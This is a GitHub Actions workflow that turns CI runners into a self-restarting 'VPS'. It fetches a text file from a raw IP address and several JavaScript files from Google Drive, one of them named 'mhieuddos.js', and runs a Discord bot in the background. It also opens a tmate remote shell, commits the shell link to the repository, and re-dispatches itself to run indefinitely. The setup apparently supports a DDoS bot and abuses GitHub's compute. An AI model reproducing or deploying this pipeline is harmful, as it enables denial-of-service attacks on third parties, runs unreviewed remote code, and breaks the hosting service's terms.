name: Create VPS (Auto Setup and Run)

on:
  workflow_dispatch:
  repository_dispatch:
    types: [create-vps]

jobs:
  start-vps:
    runs-on: ubuntu-latest
    timeout-minutes: 360  # 6 hours
    env:
      TMATE_SERVER: nyc1.tmate.io

    steps:
      - name: â¬‡ï¸ Checkout
        uses: actions/checkout@v3

      - name: ğŸ“ Prepare dirs
        run: mkdir -p links .backup

      - name: ğŸ’¾ Restore backup (optional)
        run: |
          name="${{ github.event.client_payload.vps_name || 'manual-vps' }}"
          if [ "${{ github.event.client_payload.backup }}" == "true" ]; then
            unzip ".backup/$name.zip" -d . || echo "âš ï¸ No backup found."
          fi

      - name: ğŸ› ï¸ Install dependencies
        run: |
          sudo apt update -y && sudo apt install -y tmate wget python3-pip
          pip3 install gdown
          sudo apt install -y nodejs npm

      - name: ğŸ“¥ Download vn.txt
        run: wget http://36.50.134.20:3000/download/vn.txt

      - name: ğŸ“¥ Download and rename files from Google Drive
        run: |
          gdown --id 1l7XemuQ4MuxYYzmzLYnXTF9tXw_mutgV -O mhieuddos.js
          mv mhieuddos.js hieu.js
          gdown --id 1Kpe6qSbsNaS-z0f9BMCyJsi3ooVouPLh -O shit.js
          mv shit.js raw.js
          gdown --id 1d7DjHHAqvOA5QkYw196JJZ_Vj3xMXfZF -O bot.js
          gdown --id 1FR-xolyLshOs5CeuIfHS6fIlt8rSqGS4 -O additional_file.js

      - name: ğŸ“¦ Install npm packages
        run: npm install cluster colors colorama axios crypto discord.js gradient-string

      - name: ğŸš€ Run bot.js
        run: |
          nohup node bot.js > bot.log 2>&1 &
          echo "âœ… bot.js started in background."

      - name: ğŸ” Start tmate session
        run: |
          tmate -S /tmp/tmate.sock new-session -d
          tmate -S /tmp/tmate.sock wait tmate-ready
          SSH=$(tmate -S /tmp/tmate.sock display -p '#{tmate_ssh}')
          echo "$SSH" | tee "links/${{ github.event.client_payload.vps_name || 'manual-vps' }}.txt"

      - name: ğŸ“¦ Save backup
        run: |
          name="${{ github.event.client_payload.vps_name || 'manual-vps' }}"
          zip -qr ".backup/$name.zip" . -x ".git/*" ".github/*" ".backup/*" || true

      - name: ğŸ“¤ Push updated files
        uses: stefanzweifel/git-auto-commit-action@v5
        with:
          commit_message: "ğŸ” Updated SSH + backup"
          file_pattern: 'links/*.txt .backup/*.zip *.js *.txt'

      - name: â³ Keep VPS alive
        run: |
          for i in $(seq 1 $((360))); do
            echo "ğŸŸ¢ Running minute $i/360..."
            sleep 60
          done

      - name: ğŸ” Restart workflow
        if: always()
        run: |
          curl -X POST \
            -H "Accept: application/vnd.github+json" \
            -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" \
            -H "Content-Type: application/json" \
            https://api.github.com/repos/${{ github.repository }}/dispatches \
            -d '{"event_type": "create-vps", "client_payload": {"vps_name": "manual-vps", "backup": true}}'
